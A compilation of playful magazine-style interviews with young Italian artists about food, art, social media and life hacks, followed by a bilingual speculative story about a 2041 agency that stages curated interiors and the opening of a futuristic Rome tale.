I have actually invented quite a few cocktails in my supper club but they were always based on the work of the artists I was working with. The cocktail I’d invent now would be something sort of related to brexit…Oh, I would call it Post-truth! Something really sweet but at the same time really bad for you, so it’s easy to drink but it just corrupts your stomach..something like that. And it would be the most popular colour of them all, which I guess is like pink or red… a bright colour that traps your eye: fluorescent pink!
One exhibition you wish you hadn’t seen?
That’s a tricky question because I only remember the exhibitions I liked, the other ones are kind of faded in my memory. When you have an idea of what an artist’s body of work is like but their exhibition is just another one imitating displays and standardised strategies it’s something that can leave you disappointed. So it’s just some sort of realisation of this artist you thought was revolutionary but they’ve just blended in with the rest of commercial artists….Oh, I thought of one: Damien Hirst! This was ages ago, I discovered his work in uni and I was quite impressed by it (the cow and everything…) then I went to see his exhibition, it was a huge one, he had all this gold, very over the top, it was incredibly vulgar. I was like ‘this is not what I thought it was’…it was quite an awakening. It’s so obscene and dramatic that it appeals to some sort of maybe sublime kind of concept of what art can achieve by being overwhelming but at the same time it’s just obscene..but at the same time it doesn’t mean that it’s not impressive.
You’ve just graduated right ? Do you know what will you be doing next?
This is a question I have been asking myself for two months! (haha) I have always had my priorities very clear: I know that I want to be an artist, I guess the struggle comes when you try to find the balance between your day job and your art practice, it’s a classic right? I have recently formed a band (Coskeyass), I would really like to merge my art practice with my music practice to make some form of touring-art-exhibition-concert. I have been applying for many jobs but I think I’m going to end up working as a chef again which I guess makes sense…what I want to do after graduating is to continue making art work, focusing on my band and trying to merge these practices, the way I have of making money to sustain this is usually through food: I’m either a chef of I have my supper club and I have plans to make it bigger (maybe transform it into an art residency)..I’ll just keep trying really.
Do you have a life hack you’d like to share with us?
I’m going to give you two answers. One is really obvious but nobody does it: how to chop an onion properly! It’s really simple, you peel it first and you cut it in half across the ends (without cutting off the ends). People usually do the whole thing and then it falls apart and you kind of try to hold it together..but if the end is still there it holds it all together and it’s so good, absolutely necessary in everyone’s lives.
Here is a link that shows what I’m talking about:
https://www.youtube.com/watch?v=dCGS067s0zo
The second life hack is something that has helped me a lot: my SAD lamp. It’s for us from the south, suffering from the lack of sun…it has saved my mood so many times. I use this lamp when I’m reading, working, whenever I can (I have also used it in my work). It’s this very very bright white light that simulates the light of the sun…great for when it’s a very grey day in London and you need that amount of light.This is maybe for foreigners who have nostalgia of the sun.
Let’s keep it at the onion and the sun.
Is there a question we haven’t asked you, that you’d like to ask yourself?
Something I ask myself (that I try to prevent or control) is: Do you think that you perform for social media? In the sense that you portray a version of yourself that you wish to project or. Or how manipulated or manufactured is that image? By you or the media? What kind of image am I giving through my Facebook or through my Instagram and if someone who doesn’t know me has access to that (quite personal information) who am I? When I take a selfie I think ‘oh this doesn’t work’, but why? Am I curating myself? This is like a daily performance for this invisible audience.
My response to the question would be: Yes. I am performing all the time for social media and it is so paradoxical because social media is aimed to bring your intimacy closer to other people but in a way it distances you from yourself. It’s like publishing an extra layer of imagery of this created intimacy that you are putting out there. I think very much of ‘what is going to work on instagram’, ‘I can’t put too many selfies in a row’, ‘I need to put a bit of art work, a bit of selfies etc.’ That’s going to make me look like ‘the artist’, ‘the person who is behind it’, ‘the singer’…all these things that you want to project. I think it’s scary.

What did you lose recently?
I cannot currently think of anything specific or absurd, because (there’s a reason) in the last years I’ve lost crazy amounts of stuff…like IDs and mobile phones, the usual stuff. So because of this, I’ve tried to set my things up in a way as not to lose them. I can’t remember the last time I lost something…at least something physical that is…
If you could bring one movie with you on a desert island (please be honest)?
Fuck, the movie… I can’t even remember the last film I saw. This is difficult…I’d say ‘Birdman or (The Unexpected Virtue of Ignorance)’, as it’s one of the movies I remember because I liked it. In fact it’s a movie I really liked, it’s the kind that keeps you company (on an island). I could’ve answered this question with TV shows (as now I’m really into survival, fishing and those types of shows) but then my answers might become incredibly trivial. Like, you’re already there working like crazy and trying to survive only to watch others in your exact position working like crazy and trying to survive…
Nutella/beer: If you had to eliminate one of these from you life for ever which one would it be?
Nutella, yes. For survival reasons; beer quenches your thirst and it’s more useful generally. If you had asked me to chose between a variety of spreads, I would have chosen Nutella, no doubt.
What’s the last thing you liked on instagram or Facebook or both?
A video you can find online that everybody ought to see.
The last thing you read/you’re currently reading?
The last one, I read ten minutes before starting this interview with you. I was reading an article that came out on Artribune talking about a book that focused on failure in a moment of “post everything”.
Which artist would you go on a date with?
This is hard, uhmm…. I would answer with Jonathan Meese, because it would be a crazy date. Otherwise Rihanna.
If you could work with only one material what would it be?
It would be iron or metal in general. I had started a work with drawing and sculpture made out of forged cast iron. It cost a crazy amount, between 5000 and 10000 euro to make one sculpture. I didn’t do it in the end. So, iron would be great.
It’s August. What are your holiday plans? Did you already have a holiday?
I was with my family at my hometown’s local fair for 10 days (in Canale). And now I’m going with my girlfriend to the lake of Como to then head to Salento, in Puglia. There I hope to turn off my brain. You are the last thing linking me to civilization, my last official commitment before the holidays.
Best reason to live in Milan?
The amazing amount of people you can meet and things you can do (this is coming from a person who grew up in a tiny town). It can feel like a big city but in the end it’s quite small. By bike you can go from one side to the other in 40 min. It’s manageable and yet has lots to offer. A reason not to live in Milan is that, as you can see I’m dripping, it’s August, it is 40 degrees celsius right now, but for a human being it feels like it’s about 50. That’s why I’m running away.
Life Hack?
I go crazy for videos like “how to open a pen in 20 different ways” they’re amazing. However the best thing I’d advise right now, since it’s August and some people go camping, is the camping fridge. Basically, you make a pretty deep and big hole in the ground, you place a plastic bag inside and then you cover it. It becomes a fridge next to the tent. It doesn’t cool anything just keeps stuff at a good temperature. At festivals it works great.
A question you’d like to be asked?
Nothing good comes to mind. A question could be: why do you like street signs this much? It’s something I regularly ask myself. The answer… I don’t really know but I’m especially in love with the base of street signs (I don’t know if you’ve seen my pictures). I like the blocks used to stabilize them, some crazy things, or objects created specifically for that function (made out of cement or iron). They are beautiful: spontaneous sculptures.

When will you stop being so obsessed with food? (Are you obsessed with food?)
I don’t think I’m obsessed with food, even though I’m very picky. I have to say that this year I have been very obsessed with food in the sense that everyday for lunch I’d have the same thing: I’d buy these packaged vegetables, warm them up in the microwave and I’d also buy a hotcake and an apple…because I thought all of this was more healthy (haha). I quite liked having this routine because it’s just something this certainty that at noon when I had my break I knew what to eat, where to buy it, how many minutes it had to be microwaved…
And what if the supermarket had run out?
I would’ve probably eaten at McDonalds (hahaha). This was during the week though, not weekends…on weekends I generally have pizza…to catch up on the calories.
Your cartoon crush?
Like crush (in love), that I was in love with?
Yes
I’m not sure.
Maybe more than a crush, it’s the idea that you identify with the character; you love them because you want to be them. In that case my character would be that troublemaker from Treasure Planet by Walt Disney. He’s the super cool one with all the flying skateboards and his little ponytail and crop top and overall strange look. He believes in finding this treasure since he was small, it’s great, the aesthetics are weird (a sort of cyborg-fornarina mix) if you haven’t seen it in a while I strongly recommend it!
What’s the thing that you buy most often? (That is not a basic necessity)
Since I have an Amazon account, everything I buy is basically not a necessity! Anyhow I regularly buy those present balls from dispensers (the ones with little toys or necklaces and rings). If not I buy things at the cashiers in the supermarket (that aren’t necessarily candies or chewing gums) like fake tattoos, collection cards or Hotwheels. I do this, I think, to understand better what attracts me most. Oh, and kinder eggs of course…but honestly, I think of those as a necessity.
If we were to gift you a flying ticket to fly out tomorrow, where would you go?
I would go to Seoul. A lot of my current friends are from there and I’ve had a lot of friends during my course at the RCA who are from South Korea and I’d really like to go! I find the culture quite fascinating. It’s true that a lot of my friends come from a mixed background and they’re very occidental orientated, nonetheless there are some aspects in the ways of our relations that have made me curious. We’ve had the best laughs, the best bellies full of Korean sea food pancakes and the best conversations, I’ve found in them a special sensitivity and I’ve always felt deeply loved. Also, I’d also like to go to better understand the pop culture, and the standards of beauty (the body treatment and aesthetics). It’s fascinating how there’s an attraction to the idea of cuteness; for instance in that of the image of the male singer in the musical industry of K-pop.
What’s your spiritual animal?
I know it! So many people have asked me this in the past two years, so I’ve had to think about it! I think my spirit animal is a little monkey…I have the face, I have long arms, I’d like to have their posture. I quite like monkeys, they’re active and curious.
Could you share with us some frames of your latest instagram Stories?
Here are two screenshots. The first is the Miami one, I love taking selfies under the palms near my place in Vauxhall and saying that I’m in Miami. I also tag myself and always say that I’m on holiday busy getting a tan. The second one is me and the London eye. I’ve recently been dwelling on the practices of self documentation as a way of reinforcing contemporaneity: exploring the communication of the self in the digital era.
Who’s the most fun to follow on instagram according to you?
Let me have a quick look and then I’ll get back to you.
Ok, so the profile I find fun is ‘Hipdict’.
What would your Pope name be?
I would like to keep my name, so that would be Guendalina. Then I could put a number like ‘the third’ [or terzo in Italian, terzo thus of male gender]. And then…what’s generally used?
Something for which you are recognised, like Pio 11th the Murderer (hehe).
Ok, so I’d like to be ‘Guendalina 3rd the Cutest Ever’.
Would you rather have a Cattelan golden toilet or a Damien Hirst shark?
The Shark I think. It’s pretty impressive, I think it’s more impressive to me than a golden toilet. It could be more fun during a party, like people could chuck things in and try to break the glass…rather than trying to find the bathroom and finding the golden toilet.
Life hack for us?
I have been attracted to these things for the past year, I’ve saved them on my facebook, let me have a quick look. So, this is a life hack that I found on how to eat a hamburger properly, it works!
What would you like us to ask you?
This year I have lost 3 pairs of sunglasses and 3 pairs of earphones! So, I guess my question would be: What did you lose recently?… I lose my sunglasses because I always put them on after I drink a bit (haha). This idea of putting on your glasses when you are drunk is something I find so trash, I have no idea where my impulse comes from!? (A super Italian thing to do!) And even earphones as objects are super easy to lose because they’re small, you put them down somewhere or in your pocket. It’s terrible to have to head home without the possibility of listening to music because you don’t have your earphones!

What is the last thing you bought?
I bought foundation from Wycon, €6.80. My new passion is makeup and beauty.
If you weren’t an artist what would you be doing?
Oh god. Hmm…anything really. In my life I’ve tried so many different things and I’ve tried to embody many personas: like, I’ve tried to be an engineer, a mathematician, an architect etc. but it all went pretty bad. The artist profession has treated me quite ok…maybe…
Pizza or cake?
Ahh (horrified). Pizza. It would be nice to make a cake out of pizza.
If you were only allowed one cake for the rest of your life which one would it be?
I think it’s the most difficult question anyone has ever asked me. If I have to pick one hmmm…actually, the cake that my partner Filip made for me for my birthday (that was like two weeks ago) is made up of 12 different cake slices. However, this way I’m ignoring your question, if I really have to choose, I’d probably pick a cheesecake. I think cheesecake contains both the aspects of sweet and salty food…eggs, cheese, everything, *wow*
The one thing you would like to be remembered for?
I’d like to be remembered not so much for the things that I’ve done on an artistic and musical level but rather as a pleasant and lovable person by my friends. Many artists make really great and cool things but then when they pass away they’re not truly missed and so maybe it was better for them to die in the first place. I don’t want to be that person, I want to be remembered as a fun person.
What would be written on your tombstone?
I think I’d put what I have on my Whatsapp status: ’Pizza and Sailor Moon’. That’s it.
Your last (musical) guilty pleasure?
Oh I have so many! Ok, there’s this one single by Alessandra Amoroso (this really cheap Italian singer) and there’s this album I really love by Sharon Needles who is a drag queen who won RuPaul’s Drag Race like 5 years ago.
Send us an edited screenshot of you right now (with as many stickers as you want).
A still you fell in love with recently.
If you had an art collection, what would be the number 1 piece?
The strongest piece of my art collection would be the installation of the huge penis by Simon Fujiwara: Phallusies(An Arabian Mystery). It was exhibited at the Giò Marconi gallery years ago. That exhibition made me fall in love with contemporary art.
Do you have a life hack for us?
To sweat less. So like now in Italy it’s really hot and everybody is sweating so much. In general sweating is really disgusting, everybody hates seeing other people sweat and everybody sweats.
So, you can do 2 things: First of all, equipping yourself with specialized makeup products or if you have more money you can do botox shots to stop the excessive sweating. One thing I like to do is put on a hydration cream with this very peculiar dabbing technique where you tap areas of your face with the tips of your fingers in order to reactivate the microcirculation. Only then you apply foundation and spread it (if you don’t have money, you can use a leaf from a random plant or even an eggplant). Once done, you apply transparent face powder in order to make everything set.
You can also frighten people with your makeup: cover your eyebrows and put on huge glasses. So, when you walk into a shop and the girls says ‘hi’ you look at her over the tip your glasses and you scare her. I think frightening others can help you avoid the heat.
*To cover your eyebrows, you need makeup, makeup glue, other things…hours and hours of explanation, there are plenty of tutorials out there.
What would you like us to ask you?
When does one stop being so obsessed with food?
Your response?
Oh no, I also have to reply?! I think after a cancer or after a serious illness. If one day I’ll be feeling really really bad, then I guess I’ll stop thinking about food.

Do you have a current obsession?
More than one probably…knowing me…I have to choose one?
Yes
Probably those shoes, uhmm what are they called, Raf Simons for Adidas. They’re amazing also because they’re called oswego bunny.
Milk or juice?
Juice.
…great question guys.
Somebody who deserves to be googled.
Myself! No, of course I’m kidding….hmmmm…M¥SS KETA. I should just be her PR, the number of fans I got her is quite something.
Who is M¥SS KETA for those who don’t know her?
Miss Keta, oh it’s difficult to describe..she’s a singer but not really, there’s a collective behind the whole thing called Motel Forlanini. She’s a bit like the apotheosis of Italian trash (Italian trash from Milano). So she describes, with very catchy beats, things that happen but also behaviours of the Milanese people…of course, in a really ironic and super-pushed way, as in, she never shows her face and one of her songs is called ‘Burka di gucci’.
Mountain holidays or seaside holidays?
Ah, depends if it’s summer or winter.
An artwork that disconcerted you the most in the past year?
Richard Mosse, the video at Barbican, I forgot the name of it. I thought there were some ethical issues…capitalising (or making money) on people’s suffering, without necessarily doing anything active to counterbalance it.
The last song you played on your spotify.
Chanel by Frank Ocean.
Your favourite place in London?
Aha, there are a few…Richmond park.
If you could pick an astrological sign?
Oh this is a great question!…hmm
Also which one is yours?
Scorpio but I’m aquarius, my ascendant sign is aquarius and it’s really strong. If I have to pick one…I like mine…maybe capricorn?
Some recent photos of the ‘behind the scenes’ of your art practice you’d like to share with us.
What’s the last thing you bought online?
Almost the shoes! They’re still in my cart (haha), I didn’t check out yet. Oh, some free rings! I saw them on a Facebook ad, like ‘we’re giving away these free rings’ and you just have to pay for the postage. They’re like a set of rings of these people that help turtles (haha).
So you just paid for the shipping. The last thing you bought?
The book that Kaleidoscope made about the shoes: Le Silver!! You know I went to Footlocker to try some TN (Squalo) to see how they looked on my feet and the guy(super british) working there asked me ‘are you Italian?’. Even Italians don’t think that I’m Italian…but then I thought possibly only Italians buy those shoes!
Didn’t know they still existed..quite timeless
Do you have a life hack you could share with us?
Hahaha…Using the bathtub as the bidet! Because they don’t have bidets here(in London)! (Such an Italian answer). Or also, going to Waitrose (the supermarket) and getting free coffee. If you’re a member and you buy something, they give you free coffee in a cup that says ‘Waitrose’…but if you just go back with the same cup then you can get free coffee!
Do you have a question for yourself that we didn’t ask you?
Yea, you asked me what I bought online but not what was the last coolest thing I bought (without it necessarily being online). A Synthesizer! A Korg Volca Sampler, I bought it from a guy physically…not online.
What are you using it for?
B-tss b-tss b-stt..beats. It’s a sampler, so you can load your own samples on it and you can just play. You can play live without a computer, it’s great….I’m playing with it for now but you can actually make songs out of it. It’s part of a series, there are like six different ones and you can connect them all…soon soon..one at a time.
Edoardo Manzoni

If you could only choose one dog breed which one would it be?
Great Danes. Oh no, wait, Sighthounds! Yes, Sighthounds…I don’t know why I said Great Danes, they terrify me.
City or countryside?
City. Country to find inspiration and City to work. In the city it’s easier to find ways to make your ideas happen.
One skill you’d like to master right now?
Maybe being able to construct more things on my own… I have many visions but I’d love to have more manual skills.
To make what more precisely?
To make sculptures. Actually, I’d like to make these huge sculptures in plastic materials but I still haven’t figured out how.
Have you ever thought about a rapper name? (If you haven’t got one already)
Of course I have one (haha). It would be ‘ELK’.
Like the animal?
Yes yes. Then that name also has its variations such as ‘ELKO’. I’ve always liked it.
Not Dr.Manzo? (…beats by Dr.Manzo)
No (haha), that has been my email for way too many years. Maybe Dr.Elk…no, but it sounds a bit too much like a cartoon character.
Nutella or peanut butter?
Nutella. I’ve barely ever had peanut butter, I don’t even know if I really like it.
The best person to follow on Instagram ?
The best person? Rapper’s instagram stories are the best way to clear my brain when i’m tired, I advise it. Rappers with big necklaces.
Screenshot of the last video you saw on youtube:
Photo with the most likes (both Facebook and Instagram):
Best show you saw in the past year?
I knew you would have asked this.
We’re predictable.
Humm. What did I see last year? I really liked this one, at Hangar Bicocca, of Laure Prouvost. I really like how she thinks about display, how in the videos there was sculpture… and we talked a lot about her.
Could you please share with us a life hack?
Ok.. So i’m really superstitious. I don’t know if it makes my life easier, but I’m really superstitious and I use… I always choose a one euro cent coin from my wallet and I keep it, I separate it from the others and I put it in my pocket and I keep when I have to do important things. So I’m kinda obsessed with these cents and i’m also putting them in my works.
Does it work?
Maybe so, well i don’t know. It works because I believe that if I a have one cent in my pocket things go well. It’s all belief. I’m also obsessed with magic lately. I’m studying some magic, even country/peasant/rural/farming magic (magia contadina in italian, not easy to translate directly ). But the cent coin one has always stayed since I was little. So.. I do it. I have always been attracted by the one cent, it’s so small, it’s beautiful. And now maybe they want to remove them, they won’t exist anymore.
What question would you want us to ask you? And could you answer it.
My last obsession? I would like to talk about Bruno Gironcoli, I just found out about him and I went crazy, to make these kinds of sculptures I think he must have been abducted by aliens.

Confessions from the material communication agency REAL DREAMS
written and illustrated by Natália Trejbalová
(January 2041, published in the magazine INSIDES)
After museums ceased to function as collections of material and institutions for the preservation of material assets, their entire repositories were digitized and made available on the cloud. Some of them were even sold exclusively to material communication agencies, such as the one Neila works for, in a generalized attempt to share humanity’s objects.
This move has been much criticized, especially in the academic field, for obvious reasons also because it had been considered a form of experiential conservatism.
Now the first generation to have been able to experience museums only through virtual journeys is twenty years old and the culture and history we can access today is based on complete immateriality.
We interviewed some REAL DREAMS employees to find out what it is like to work for one of the most important material communication agencies.
Neila, 29 years old, assistant to the location designer
“Ah, you want to know what a normal workday is like? Basically, I spend all day scouring our database for models of objects, representations and visuals that could work if added to our locations. We have full rights to replicate a vast amount of designer furniture and partial rights to many works of art and artifacts, but also to many everyday objects.
We always start from a dozen templates of interiors that we then customise. Clients give me key words, the basic concepts that they would like the space to communicate and I reconstruct everything: I copy the models of designer furniture, I edit them to match the colours of the house in question, I add details taken from other databases: for example models of exotic sculptures, non-European cultures or collections of historical artifacts to make the interior more peculiar. Customers also ask us to create renders where they are featured in the space, it is a default request.
I personally have more fun creating ornaments. I always take basic objects from the archive and then fix them – I add details from other archives, change colours, customise. For some I also prepare fictitious holiday photographs – we also have image banks, these come from private archives – naturalistic souvenirs taken during overseas trips, books. Many of our clients are people who need a representative house and until recently they did not own anything. They need to build a new past for themselves, it is not pleasant for anyone to reveal that they come from outside. These people’s past is poor, therefore not material. Having material memories is a status symbol that can only be afforded by those who really earn a lot. Physical space is very precious.
I wouldn’t say that I’m building them a personality or memories. I’m just helping them blend in with the environment of the social class they’ve landed in.“
Camilli, 35 years old, assistant to the location manager
“You don’t meet anyone. When you’re working, it’s just you and the location you’re fixing. In the catalogue we have everything – general historical settings, for example the usual New York loft of the guy who worked in finance in the 2000s, the apartment full of books of a professor of philosophy, the classic terraced house of an English family of the ’60s and the studio of a Parisian artist from the beginning of the century. Most of the time we have requests for twentieth-century settings, but every now and then some clients are also interested in other eras. Alongside the general offers there are also more precise settings, linked to historical characters, contemporary or invented, or locations taken from specific moments. For example, I often work with film and TV characters’ houses – Monica’s apartment from the famous Friends tv series, the motel room where Marion stays before being murdered in Psycho, the restaurant where Mia and Vincent dance the twist in Pulp Fiction, the parking lot with Forrest Gump’s bench, the bar where Obi-Wan Kenobi and Luke Skywalker meet Han Solo for the first time in Star Wars, the hotel room where Willard stays in Apocalypse Now, the caravan from Breaking Bad, Laura Palmer’s room in Twin Peaks…
Basically you follow your home template. The work is quite manic, yes. These spaces are redesigned down to the last detail. They seem to have been lived in, but even the decorative objects have been remodelled. When you look at them closely enough, you start seeing small imperfections due to the construction procedure. They are almost untouchable, but true connoisseurs know how to distinguish them, it takes a trained eye. I only replace the pieces of food, the fresh plants, the small details from daily use. Our agency has a team of set designers that kind of looks more like a team of forensic detectives.
There are certain scenes that I especially like, so I do them over and over and now I can remember some small details – the half-smoked cigarette that left in the ashtray, the peeled orange left by the fireplace…
When you enter a scene to prepare it, it’s like entering the house of someone who’s just disappeared. It’s impressive. I’m very curious, but sometimes I feel uninvited. To fix it up properly, you have to reconstruct what happened in the space when the previous customers were there. So you fix the traces and all the details they left behind and return the space to its original state.
And that’s the heaviest task of all. Not so much the guessing, but not judging. I don’t want to go into details, my agency is based on discretion… I’m just saying that there is a department that can also create bodies, more or less living, let’s say custom-made. They are not fully aware, or at least I’ve always been told so. The bodies that inhabit these spaces have expiring memory, they cannot live more than the rent time of the space. Once I had to clean up after a sort of party, I think it was a scene from a Woody Allen movie, with a dozen of them, at the end of their allotted time they fell like handkerchiefs… There were also open bottles of sparkling wine, a vintage TV on, a record player that kept going and, in the midst of it all these bodies withered like a bouquet of flowers.
They are very expensive to do, these expiring bodies, usually there is at the most one per space.“
Sarou, 43 years old, ex-location performer
“Yes, I used to work there as a performer, always there.
Nah, maybe I should have stayed there. Even after that accident. You know, I like acting. I was amazing at performing certain characters. We actors got paid very well. Then there were those there too, the ones that expired.
It didn’t matter to me that every now and then there were also these sexual aspects to the work… In the end, you had to play your character until the last moment. Most of the times you met the client, it was more a matter of psychology. A kind of therapy. They might not be able to talk to their sister or brother and they meet you who looks the same, because they want you like that, and that would bring back family secrets, missing love, things like that. Obviously there were clients who wanted to fuck someone who looked like their favorite actress or actor. In those cases it was up to you if you were going to do the drama or if you just accepted it. Oh, every now and then it was also fun to just go along. They were all rich, so sometimes, for unofficial meetings, you didn’t need to go through the agency and you could just make a nice sum of money for yourself…
I’m specialised in the 1900s, which is also the most difficult to interpret – there are too many peculiarities. In short, my professional wardrobe was supplied with all the styles and vocabularies of the various decades. I mostly worked on film locations, but also in the private sector – in these new houses, I now recognized the style of our agency designer, some details kept repeating… There was this Chinese statue always placed somewhere. Once I found it in the bathroom, next to the bath, in the blue-white ceramic version, another time in terracotta in the library. I think it was a sort of signature of his.”

Confessioni dall’agenzia di comunicazione materiale REAL DREAMS
scritto e illustrato da Natália Trejbalová
(gennaio 2041, pubblicato per la rivista INSIDES)
Dopo che i musei hanno smesso di funzionare come collezioni di materiali e come istituzioni per la conservazione di questi beni materiali, i loro interi depositi sono stati digitalizzati e messi a disposizione sul cloud. Alcuni sono stati anche venduti in esclusiva a delle agenzie di comunicazione materiale, come quella per la quale lavora Neila, in un tentativo più generale di condivisione dei beni dell’umanità.
Questa mossa è stata molto criticata, soprattutto in ambito accademico, per ovvie ragioni e anche per quello che è stato detto un conservativismo esperenziale.
Adesso ha compiuto vent’anni la prima generazione che ha potuto fare esperienza dei musei solo attraverso viaggi virtuali. La cultura e la storia a cui possiamo accedere oggi si basa su una completa immaterialità.
Abbiamo intervistato alcuni dipendenti della REAL DREAMS per scoprire di più su cosa voglia dire lavorare per una delle agenzie di comunicazione materiale più importanti.
Neila, 29 anni, assistente al designer di location
“Ah, vuoi sapere come è il mio lavoro quotidiano? In pratica, passo tutto il giorno a cercare all’interno del nostro database dei modelli di oggetti, di rappresentazioni e di visuali che potrebbero funzionare se applicati alle nostre location. Abbiamo tutti i diritti di replicare una vasta quantità di arredamento di design e dei diritti parziali per quanto riguarda tante opere d’arte e manufatti, ma anche tanti materiali di uso quotidiano.
Partiamo sempre da una decina di template di interni che poi personalizziamo. I clienti mi danno delle parole chiave, i concetti di base che vorrebbero che il loro interno comunicasse e io ricostruisco tutto: ricopio i modelli dei mobili di design, li riassesto con i colori della casa in questione, aggiungo dei dettagli presi da altri database: ad esempio dei modelli di sculture esotiche, di culture non europee o collezioni di reperti storici per rendere l’interno più particolare. I clienti ci chiedono anche dei render con loro stessi all’interno del soggiorno, è una richiesta di default.
Io personalmente mi diverto di più a creare dei soprammobili. Prendo sempre degli oggetti di base dall‘archivio e poi li aggiusto – aggiungo dei dettagli da altri archivi, cambio i colori, personalizzo. Per alcuni preparo anche delle fotografie fittizie di vacanze (abbiamo anche delle banche di immagini, queste vengono da archivi privati), dei souvenir naturalistici presi durante dei viaggi oltre oceano, dei libri. Tanti dei nostri clienti sono persone che hanno bisogno di una casa rappresentativa ma fino a poco fa non possedevano niente. Hanno bisogno di costruirsi un nuovo passato, per nessuno è piacevole che si scopra che proviene da fuori. Il passato di queste persone è povero quindi non materiale. Avere delle memorie materiali è uno status symbol che si può permettere solo chi guadagna davvero tanto. Lo spazio fisico è preziosissimo.
Non direi che sto costruendo loro una personalità o delle memorie. Li sto solo aiutando a mimetizzarsi nell’ambiente di classe in cui sono approdati.“
Camilli, 35 anni, assistente al location manager
“Non c’è nessuno che incontri. Durante il lavoro, ci sei solo tu e la location che stai mettendo a posto. Nel catalogo abbiamo di tutto – ambientazioni storiche generali, ad esempio il solito loft newyorkese del tipo che lavora nella finanza negli anni 2000 come l’appartamento pieno di libri di un professore di filosofia, la classica casetta a schiera di una famiglia inglese degli anni ’60 e lo studio di un artista parigino dell’inizio del secolo, sempre nel 900 ecc. Sì, per lo più abbiamo richiesta di ambientazioni novecentesche, ma ogni tanto i nostri clienti si interessano anche ad altre epoche. Affianco all’offerta generale poi ci sono ambientazioni più precise, legate a personaggi storici, contemporanei o inventati, o delle location prese da momenti particolari. Ad esempio io lavoro spesso con case di personaggi cinematografici e televisivi – l’appartamento di Monica della famosa serie Friends, la stanza del motel dove soggiorna Marion prima di essere uccisa in Psycho, il ristorante dove Mia e Vincent ballano twist in Pulp Fiction, il parchetto con la panchina di Forrest Gump, il bar dove Obi-Wan Kenobi e Luke Skywalker incontrano Han Solo per la prima volta in Guerre Stellari, la stanza d’albergo dove soggiorna Willard in Apocalypse Now, il caravan di Breaking Bad, la camera di Laura Palmer in Twin Peaks…
Di base tu segui il tuo manuale di casa. Il lavoro è abbastanza maniacale, sì. Ci sono questi spazi, ridisegnati fino all’ultimo dettaglio. Sembrano vissuti, ma anche gli oggetti di decorazione sono stati rimodellati. Quando li osservi abbastanza bene, cominci a vedere le piccole imperfezioni dovute alla procedura di costruzione. Sono quasi intoccabili ma i veri intenditori li sanno distinguere. Ci vuole un occhio addestrato. Io sostituisco soltanto i pezzi di cibo, le piante fresche, i piccoli dettagli di sporcizia quotidiana. La nostra agenzia ha una squadra di scenografi che assomiglia quasi di più ad una squadra di detective forensi.
Ci sono certe scene che piacciono molto, quindi le rifaccio spesso e ormai mi ricordo alcuni piccoli dettagli – la sigaretta mezza fumata che sporge dal posacenere nel senso opposto, l‘arancia sbucciata accanto al camino…
Quando entri in una scena per prepararla, è come entrare in casa di qualcuno che è appena scomparso. Fa impressione. Io sono molto curiosa, però ogni tanto mi sento non invitata. Per sistemare bene, devi ricostruire cosa è successo in quel posto al passaggio dei clienti precedenti… Così rimedi le tracce e tutti i dettagli che hanno lasciato loro e fai ritornare lo spazio al suo stato originale.
Ed è quello il compito più pesante della faccenda. Non tanto indovinare, ma non giudicare. Non vorrei entrare nei dettagli, la mia agenzia si basa sulla discretezza… Dico solo che c’è un reparto che può creare anche dei corpi, più o meno viventi, diciamo su misura. Non sono pienamente consapevoli, o almeno a me han sempre detto così. I corpi a scadenza che abitano questi spazi, con la memoria a scadenza, non possono vivere più del tempo dell’affitto di quel luogo. Una volta ho dovuto sistemare dopo una sorta di festa, credo fosse la scena di un film di Woody Allen, con una decina di loro, dopo la fine del loro tempo si afflosciavano come dei fazzoletti… C’erano anche delle bottiglie di spumante aperte, una TV d’epoca accesa, il giradischi che continuava ad andare e, nel mezzo, questi corpi appassiti come un bouquet di fiori.
Sono molto cari da fare, i corpi a scadenza, solitamente ce n’è al massimo uno per spazio.“
Sarou, 43 anni, ex-location performer
“Sì, prima lavoravo lì come performer, sempre lì.
No, forse avrei dovuto rimanerci. Anche dopo quell’incidente. Sai, a me piace recitare. Fare certi personaggi poi mi veniva da dio… Noi attori venivamo pagati molto bene. Poi c’erano anche quelli lì, quelli a scadenza.
A me non pesava che nel lavoro ogni tanto ci fossero anche questi risvolti sessuali… Alla fine tu dovevi recitare il tuo personaggio, fino all’ultimo. La maggior parte dei casi in cui incontravi il cliente, era più una questione di psicologia. Una sorta di terapia. Questi magari non riuscivano a parlare con la propria sorella o fratello, incontravano te che sembravi uguale, perché ti hanno voluto così, e poi ti ributtavano addosso i segreti di famiglia, l’affetto mancato, cose così. Ovviamente c’era chi si voleva scopare una che sembrava la sua attrice o attore preferito, il classico, lì poi stava a te se facevi il dramma o ci stavi. Oh, ogni tanto era anche divertente. Tanto questi erano tutti ricchi, per cui ad una certa, per un altro incontro, magari non passavi per l’agenzia e ti beccavi una bella somma così…
Io ero specializzata nel ‘900, che è anche il più difficile da interpretare – ci sono troppe peculiarità. Insomma, il mio armadio professionale era fornito con tutti gli stili e i vocabolari dei diversi decenni. Lavoravo di più sulle location cinematografiche, ma anche nel privato – in queste case nuove, ormai riconoscevo lo stile del nostro designer dell‘agenzia, alcuni dettagli si ripetevano… C’era questa statuetta cinese piazzata sempre da qualche parte. Una volta l’ho trovata in bagno, affianco alla vasca, nella versione di ceramica bianco-azzurrina, un‘altra volta in terracotta nella libreria. Credo fosse una sorta di sua firma.”

Rome, 2218
The sun was already shining that morning in Piazza dei Ponziani and the sky was bright blue as always. The trees were following their regular weekly cleaning, the smell of hot croissants spreading overbearingly in homes and the safety road barriers were beginning to lower and slowly disappear into the ground.
Octavio lived on the fifth floor of the corner building, the one with the centuries-old ivy with iridescent leaves, and that morning he had woken up early because of that research he had been postponing for days.
Octavio was in his first year of Engineering at university and had never liked going to the Tiberino Archive to study, it was a building too solemn for his taste, as if having previously been a hospital worried him a priori.
That day, however, he had no other choice, because his deadline was set for tomorrow.
He got ready, turned the music on and went out.
The barriers were already gone, the drawbridge was now low and Octavio had no more excuses to delay. Ever since he was a child he loved to see the mechanisms of barriers, bridges and aqueducts in action, whether they were closing or opening, it was something that had always fascinated him.
Seeing the confines of his neighbourhood rising always gave him a slight thrill; he felt, in a tangible way, the beginning or the end of a possibility, inexorable and incontrovertible and that wait in front of the mechanisms in operation always moved him, to the point of getting so nervous every time that some structure got stuck halfway, which often happened due to the complex foundations of the city.
In any case, that day there were no barriers to move him or make him nervous and in no time he was in front of the large garden of the Tiberino Archive.
“Hi Octavio, have you seen the new gloves with 50 TB of memory? The model you have is now 4 years old, why don’t you try these?”
